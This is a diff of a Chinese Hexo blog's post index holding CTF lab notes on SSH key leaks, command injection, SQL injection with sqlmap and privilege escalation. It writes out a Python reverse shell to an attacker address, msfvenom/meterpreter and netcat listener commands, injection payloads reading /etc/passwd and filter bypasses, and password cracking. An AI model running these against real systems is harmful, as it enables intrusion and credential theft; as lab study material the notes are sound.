class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
+<p>破解密码后，重新启动msfconsole，并输入相关参数，但是密码直接设置为破解出来的密码pwd</p>
+<p><code>set password pwd</code></p>
+<p>打开会话</p>
+<p><code>sessions -i l</code></p>
+<p>优化终端</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p>然后输入</p>
+<p><code>su - root</code></p>
+<p>输入破解出来的密码pwd，成功提权</p>
+<hr>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>挖掘是否有定时任务 &#96;car &#x2F;etc&#x2F;crontab</p>
+<p>如果有定时计划文件但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限</p>
+<p>如果有定时执行的文件，可以切换到对应目录，查看对应权限，查看当前用户是否有读写权限</p>
+<p>反弹shell编写</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">`#!/usr/bin/python`</span><br><span class="line"></span><br><span class="line">`import os,subprocess,socket`</span><br><span class="line"></span><br><span class="line">`s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)`(参数可不加，表示使用以太网和tcp套接字)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口”))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-¡&quot;])</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>在扫描的全部信息里寻找是否为http服务</p>
-</blockquote>
-<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
-<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
-<p>注意到flag.txt，打开获得flag</p>
-<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
-<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
-<p>在浏览器输入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
-
-<p> 匿名登录ftp服务器根目录</p>
-<p>发现flag</p>
-<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
-<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
-
-<p>然后依次打开robots.txt中的目录</p>
-<p>发现命令执行窗口</p>
-<p>于是想到命令注入</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
-</blockquote>
-<p>找到在home下的用户Summer</p>
-<p>然后利用ssh远程连接</p>
-<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
-<p>于是利用这个端口进行连接</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
-
-<p>于是得到反弹shell</p>
-<p>利用pwd ls cat more等命令</p>
-<p>查看flag</p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
+<p>攻击机netcat命令监听相关端口（未占用）</p>
+<p><code>nc -lvp 端口</code></p>
+<p>查看占用端口 <code>netstat -pantu</code></p>
+<hr>
+<h3 id="利用自带文件产生溢出调用bash"><a href="#利用自带文件产生溢出调用bash" class="headerlink" title="利用自带文件产生溢出调用bash"></a>利用自带文件产生溢出调用bash</h3><p>登陆后发现不是root权限，于是查看根目录</p>
+<p><code>cd /root</code>  <code>ls</code></p>
+<p>可能会发现flag.txt，但是可能没有权限直接打开</p>
+<p>于是查找具有root权限的文件</p>
+<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
+<p>发现read_message名字与根目录类似</p>
+<p><code>cat read_message.c</code></p>
+<p>可能会找到flag2</p>
+<p>代码审计下面的c语言</p>
+<p>发现调用这个message这个文件并输出相关信息</p>
+<p>打开read_message</p>
+<p><code>read_message</code></p>
+<p>然后我们输入SimonAAA</p>
+<p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
+<hr>
+<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
+<p>然后就可以成功打开flag.txt文件</p>
+<hr>
+<h2 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h2><ol>
+<li>查看当前用户<code>whoami</code></li>
+<li>查看当前用户的权限<code>id</code></li>
+<li>查看所有用户的列表 <code>cat/etc/passwd</code></li>
+<li>查看用户组 <code>cat /etc/group</code></li>
+<li>查看属于某些用户的文件<code>find / -user 用户名</code></li>
+<li>查看缓冲文件目录 <code>/tmp</code></li>
+</ol>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -537,129 +1206,8 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>common</tag>
+        <tag>ssh</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>sql注入（IP命令行）</title>
-    <url>/2024/09/11/3bc19a255208/</url>
-    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
-<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
-<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
-<p>尝试弱口令登录，失败</p>
-<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
-<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
-</blockquote>
-<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
-<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
-<p>利用sqlmap利用SQL注入漏洞</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
-
-<p>查找到对应的用户名和密码，登录系统</p>
-<p>上传shell反弹权限</p>
-<p>生成反弹shell</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
-
-<p>将生成的shell保存到php文件中</p>
-<p>监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后上传webshell，实现反弹，获取flag</p>
-<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
-<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
-<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>得到用户名和密码</p>
-<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
-<p><code>/wordpress/wp-login.php</code></p>
-<p>输入用户名和密码，登陆后台。</p>
-<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
-<p>利用自带的反弹shell</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
-
-<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
-<p>启动监听</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
-
-<p>访问上传webshell的地址(上传到404页面)</p>
-<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
-<p>成功反弹</p>
-<p>然后优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>利用su提权</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
-
-<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
-<p>提权成功</p>
-<p>然后到&#x2F;root目录获取flag</p>
-<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
-<p>扫描出X-Forwarded-For sql注入</p>
-<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>成功获取用户名和密码，登录到后台</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/09/11/60ab45b83526/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
   </entry>
   <entry>
     <title>sql注入（web界面）</title>
@@ -820,89 +1368,98 @@
       </tags>
   </entry>
   <entry>
-    <title>ssh密钥泄露</title>
-    <url>/2024/09/11/478a9824d4db/</url>
-    <content><![CDATA[<h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="先用nmap扫描ip端口"><a href="#先用nmap扫描ip端口" class="headerlink" title="先用nmap扫描ip端口"></a>先用nmap扫描ip端口</h3><p>探测靶场开放的服务和服务版本：<code>nmap -sV ip</code></p>
-<p>探测靶场全部信息：<code>nmap -A -v ip</code></p>
-<p>探测靶场的操作系统类型和版本： <code>nmap -O ip</code></p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<hr>
-<h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
-<p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
-<p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
-<p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
-<hr>
-<h3 id="寻找ssh用户名，得到私钥"><a href="#寻找ssh用户名，得到私钥" class="headerlink" title="寻找ssh用户名，得到私钥"></a>寻找ssh用户名，得到私钥</h3><ol>
-<li><p>然后依次打开后面的目录<br>成功下载后，第二个文件就是一个认证文件，可以找到用户名，ssh连接徐娅用户名，假如用户名为simon</p>
-</li>
-<li><p>可能在网站主页寻找</p>
-</li>
-</ol>
-<p><code>ssh -i id_rsa simon@ip</code></p>
-<hr>
-<h4 id="利用nikto寻找是否有私钥"><a href="#利用nikto寻找是否有私钥" class="headerlink" title="利用nikto寻找是否有私钥"></a>利用nikto寻找是否有私钥</h4><p><code>nikto -host ip</code></p>
-<p>可以扫描出敏感目录并且提示 </p>
-<p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
-<p>可以利用<code>wget url</code>来下载文件</p>
-<h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
-<p>ssh2john id_rsa &gt; rsacrack</p>
-<p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
-<p>然后利用破解的密码进行ssh登录</p>
-<hr>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="暴力破解思路"><a href="#暴力破解思路" class="headerlink" title="暴力破解思路"></a>暴力破解思路</h3><p>先下载cupp</p>
-<p><code>git clone https://github.com/jeanphorn/common-password.git</code></p>
-<p>进入目录给cupp.py提权 <code>chmod +x cupp.py</code></p>
-<p>以交互方式创建字典 <code>./cupp.py -i</code></p>
-<p>利用metasploit破解ssh</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username name(对应用户名)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file name.txt(前面生成的字典)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads 5(设置线程)</span><br><span class="line"></span><br><span class="line">show options(查看参数)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span>(返回相关信息)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+    <title>sql注入（IP命令行）</title>
+    <url>/2024/09/11/3bc19a255208/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
+<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
+<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
 
-<p>破解密码后，重新启动msfconsole，并输入相关参数，但是密码直接设置为破解出来的密码pwd</p>
-<p><code>set password pwd</code></p>
-<p>打开会话</p>
-<p><code>sessions -i l</code></p>
-<p>优化终端</p>
-<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
-<p>然后输入</p>
-<p><code>su - root</code></p>
-<p>输入破解出来的密码pwd，成功提权</p>
-<hr>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>挖掘是否有定时任务 &#96;car &#x2F;etc&#x2F;crontab</p>
-<p>如果有定时计划文件但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限</p>
-<p>如果有定时执行的文件，可以切换到对应目录，查看对应权限，查看当前用户是否有读写权限</p>
-<p>反弹shell编写</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">`#!/usr/bin/python`</span><br><span class="line"></span><br><span class="line">`import os,subprocess,socket`</span><br><span class="line"></span><br><span class="line">`s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)`(参数可不加，表示使用以太网和tcp套接字)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口”))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-¡&quot;])</span><br></pre></td></tr></table></figure></div>
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
+<p>尝试弱口令登录，失败</p>
+<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
+<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
+</blockquote>
+<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
+<p>利用sqlmap利用SQL注入漏洞</p>
